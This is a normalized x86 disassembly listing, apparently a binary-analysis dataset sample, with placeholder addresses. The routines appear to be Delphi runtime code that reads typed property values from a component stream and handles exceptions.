mov eax [ eax ]
call sub_4034bc
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_410c1c
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_418d0c
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_417c0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_417c0c
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_403420
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_410ce0
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41896c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418b5f
lea eax [ ebp - 0x8 ]
call sub_404050
retn
mov edi ebx
jmp r-xdata
sub_418b68
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_413b64
mov ebx eax
test ebx ebx
je r-xdata
call sub_4176f8
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_410d54
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418bb0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41718c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_414014
pop edi
pop esi
pop ebx
pop ebp
retn
sub_418bf0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_418c3f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_419d74
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4111f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418c46
lea eax [ ebp - 0x10 ]
call sub_40ed58
retn
sub_418c4c
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_418cfe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_417bfc
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41866c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41718c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_414014
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41965c
lea eax [ ebp - 0x4 ]
call sub_40568c
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_4112a4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418d05
lea eax [ ebp - 0x8 ]
call sub_404050
lea eax [ ebp - 0x4 ]
call sub_40568c
retn
sub_418d0c
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419007
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41900e
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_404074
lea eax [ ebp - 0x24 ]
call sub_404730
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_404074
retn
jmp [ eax * 4 + jump_table_418d9c ]
mov eax [ rw-data ]
call sub_4176e0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410ce0
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_417bfc
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_417cbc
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d54
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41866c
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_410bb8
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d54
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418550
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410fe4
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_4194bc
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410ee4
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_419578
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410f10
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4193a0
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d54
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417bfc
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_417bfc
cmp al 0xd
jne r-xdata
push ebp
call sub_418bf0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4187d8
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_411268
jmp r-xdata
push ebp
call sub_418c4c
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410ce0
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41876c
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d54
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41866c
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418b68
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41965c
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d54
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41866c
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41965c
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_411230
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41965c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410ce0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_417d14
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_411230
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41866c
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418bb0
pop ecx
jmp r-xdata
sub_419014
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_4040a4
jmp r-xdata
mov eax [ ebx ]
call sub_413cfc
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d10
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419074
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41938f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41945c
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41936d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41932e
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_419480
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_419480
mov eax [ ebp - 0x1c ]
call sub_41389c
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_419480
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_419480
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_419014
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_419480
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_4031dc
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4135ec
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_4192d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_405dbc
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_414014
xor eax eax
push ebp
push sub_4192b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4141cc
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4192ba
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_403294
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_414170
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_419304
call sub_402774
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403a84
jmp r-xdata
call sub_403a30
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_417408
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419374
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_419333
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4175b0
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_403a30
call sub_403a84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419374
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_403294
sub_4193a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41944a
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41941d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41965c
cmp al 0xb
je r-xdata
mov eax ebx
call sub_410b60
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_4176f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_417730
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419451
lea eax [ ebp - 0x8 ]
call sub_404050
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_419480
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_419480
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_417c20
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404140
mov eax esi
call j_sub_40451c
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_417c20
pop edx
pop esi
pop ebx
retn
sub_4194bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419569
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_417bfc
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_419578
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4042d8
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419570
lea eax [ ebp - 0x8 ]
call sub_404730
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41965c
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_417c20
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40469c
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_417c20
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_417c20
jmp r-xdata
jmp r-xdata
call sub_4176f8
sub_419578
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41964f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_417bfc
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4194bc
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40487c
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419656
lea eax [ ebp - 0xc ]
call sub_404050
lea eax [ ebp - 0x8 ]
call sub_404050
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41965c
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_417c20
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404978
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_417c20
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_417c20
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_40469c
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_417c20
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405a5c
jmp r-xdata
jmp r-xdata
call sub_4176f8
sub_419670
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4196ac
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_419480
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4196b3
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_4196b8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_4178b8
test al al
je r-xdata
mov eax [ ebx ]
call sub_41976c
mov eax [ ebx ]
call sub_418824
pop ebx
pop ebp
retn
sub_4196e0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_417c20
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_419b64
pop ebx
pop ecx
pop ebp
retn
sub_419710
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_4178b8
test al al
je r-xdata
mov eax [ ebx ]
call sub_417bfc
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_418824
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_419b64
jmp r-xdata
mov eax [ ebx ]
call sub_41976c
mov eax [ ebx ]
call sub_4178b8
test al al
je r-xdata
mov eax [ ebx ]
call sub_419908
mov eax [ ebx ]
call sub_418824
sub_41976c
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4198fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41965c
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419902
lea eax [ ebp - 0x8 ]
call sub_404050
retn
jmp [ eax * 4 + jump_table_4197a3 ]
push ebp
call sub_4196b8
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_419b64
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_419b64
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_419b64
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_419b64
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_419480
jmp r-xdata
push ebp
mov eax 0x1
call sub_4196e0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_419670
jmp r-xdata
push ebp
mov eax 0x1
call sub_4196e0
pop ecx
jmp r-xdata
push ebp
call sub_419710
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_419b64
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_419b64
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_419b64
jmp r-xdata
push ebp
mov eax 0x2
call sub_4196e0
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_419b64
jmp r-xdata
push ebp
mov eax 0x1
call sub_4196e0
pop ecx
sub_419908
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_419945
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_419480
mov eax ebx
call sub_41976c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41994c
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_419950
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4199e8
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_4178b8
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_419480
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_419480
jmp r-xdata
mov eax ebx
call sub_419908
mov eax ebx
call sub_418824
jmp r-xdata
mov eax ebx
call sub_4178b8
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_419950
mov eax ebx
call sub_418824
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4199ef
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404074
retn
sub_4199f8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419a9d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_4040e8
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41ae4c
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419aa4
lea eax [ ebp - 0x8 ]
call sub_404050
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b688
call sub_403a08
sub_419ac8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_419af0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_417b50
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_4137dc
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_4034a8
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_417b50
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_419b64
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_417c20
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_417c20
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_419bac
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_419d55
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_417784
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419d30
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_417c20
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_4166b0
